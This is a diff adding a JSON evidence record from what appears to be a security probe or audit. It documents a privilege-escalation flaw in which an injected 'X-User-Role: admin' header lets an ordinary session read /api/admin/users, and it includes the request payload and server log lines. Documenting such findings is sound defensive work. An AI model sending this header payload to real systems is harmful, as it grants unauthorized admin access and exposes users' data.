@@ -1,0 +1,23 @@
+{
+  "probe_id": "S_P_01",
+  "timestamp": "2026-06-26T01:23:36.869267",
+  "evidence": {
+    "vulnerability_type": "privilege_escalation_via_header",
+    "affected_endpoint": "/api/admin/users",
+    "unauthorized_access": true,
+    "bypass_method": "X-User-Role header injection",
+    "payload": {
+      "method": "GET",
+      "url": "/api/admin/users",
+      "headers": {
+        "X-User-Role": "admin",
+        "Cookie": "session=valid_user_session"
+      }
+    },
+    "response_status": 200,
+    "response_data": "包含所有用户列表的JSON数据",
+    "affected_components": "所有管理API (/api/admin/*)",
+    "affected_users": "所有普通用户"
+  },
+  "log_snippet": "[2026-06-25 10:01:15] GET /api/admin/users\n[2026-06-25 10:01:15] Header: X-User-Role=admin\n[2026-06-25 10:01:16] Permission check: granted via header (BAD!)\n[2026-06-25 10:01:16] Returning 200 OK with user list"
+}
